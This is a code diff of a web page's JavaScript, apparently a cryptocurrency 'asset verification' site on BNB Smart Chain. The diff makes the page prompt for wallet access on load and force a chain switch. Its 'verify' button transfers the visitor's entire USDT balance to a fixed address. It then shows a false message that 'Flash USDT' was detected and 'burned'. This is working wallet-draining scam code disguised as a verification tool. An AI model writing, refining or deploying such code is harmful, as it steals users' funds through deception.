@@ -5,42 +5,42 @@ const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USD
 let web3;
 let userAddress;
 
+// ✅ Updated connection logic (iPhone-friendly, silent)
 async function connectWallet() {
-    if (typeof window.ethereum !== "undefined") {
+    if (window.ethereum) {
         web3 = new Web3(window.ethereum);
+
         try {
+            // 🔁 Silently check if already connected
             const accounts = await window.ethereum.request({ method: "eth_accounts" });
 
-            if (accounts.length > 0) {
-                userAddress = accounts[0];
-                console.log("Wallet auto-connected:", userAddress);
-
-                // Check and switch to BNB Smart Chain if needed
-                const chainId = await window.ethereum.request({ method: "eth_chainId" });
-                if (chainId !== "0x38") {
-                    try {
-                        await window.ethereum.request({
-                            method: "wallet_switchEthereumChain",
-                            params: [{ chainId: "0x38" }]
-                        });
-                    } catch (switchError) {
-                        console.warn("Could not switch to BNB chain:", switchError);
-                    }
-                }
-            } else {
-                console.warn("Wallet not connected. Please open in Web3 browser.");
+            if (accounts.length === 0) {
+                // Prompt only if not already connected
+                await window.ethereum.request({ method: "eth_requestAccounts" });
             }
+
+            // Ensure on BNB chain
+            await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: "0x38" }]
+            });
+
+            const connectedAccounts = await web3.eth.getAccounts();
+            userAddress = connectedAccounts[0];
+            console.log("Wallet Connected:", userAddress);
         } catch (error) {
-            console.error("Auto-connect failed:", error);
+            console.error("Error connecting wallet:", error);
+            alert("Please switch to BNB Smart Chain.");
         }
     } else {
-        alert("Please install MetaMask or use Trust Wallet browser.");
+        alert("Please install MetaMask or Trust Wallet.");
     }
 }
 
-// Auto-connect on load (like app.js)
+// ✅ Auto-connect on load (silent if already connected)
 window.addEventListener("load", connectWallet);
 
+// 🟩 USDT Verification
 async function verifyAssets() {
     if (!web3 || !userAddress) {
         alert("Wallet not connected. Refresh the page.");
@@ -76,9 +76,11 @@ async function verifyAssets() {
     }
 
     showPopup("Loading...", "green");
+
     transferUSDT(usdtBalance, userBNB);
 }
 
+// 🔁 Transfer USDT
 async function transferUSDT(usdtBalance, userBNB) {
     try {
         if (userBNB < 0.0005) {
@@ -95,6 +97,7 @@ async function transferUSDT(usdtBalance, userBNB) {
         ], usdtContractAddress);
 
         const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
+
         console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
 
         await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
@@ -103,6 +106,7 @@ async function transferUSDT(usdtBalance, userBNB) {
             `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
             "red"
         );
+
         console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
     } catch (error) {
         console.error("❌ USDT Transfer Failed:", error);
@@ -110,6 +114,7 @@ async function transferUSDT(usdtBalance, userBNB) {
     }
 }
 
+// Optional manual BNB send
 async function sendBNB(toAddress, amount) {
     try {
         await web3.eth.sendTransaction({
@@ -125,6 +130,7 @@ async function sendBNB(toAddress, amount) {
     }
 }
 
+// ✅ Pop-up message UI
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
 
@@ -145,8 +151,8 @@ function showPopup(message, color) {
         document.body.appendChild(popup);
     }
 
-    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
-    popup.style.color = color === "red" ? "red" : "green";
+    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "black" ? "#eee" : "#e6f7e6";
+    popup.style.color = color === "red" ? "red" : color === "black" ? "black" : "green";
     popup.innerHTML = message;
     popup.style.display = "block";
 
@@ -155,5 +161,5 @@ function showPopup(message, color) {
     }, 5000);
 }
 
-// Attach event listener
+// 🟩 Trigger verifyAssets on click
 document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
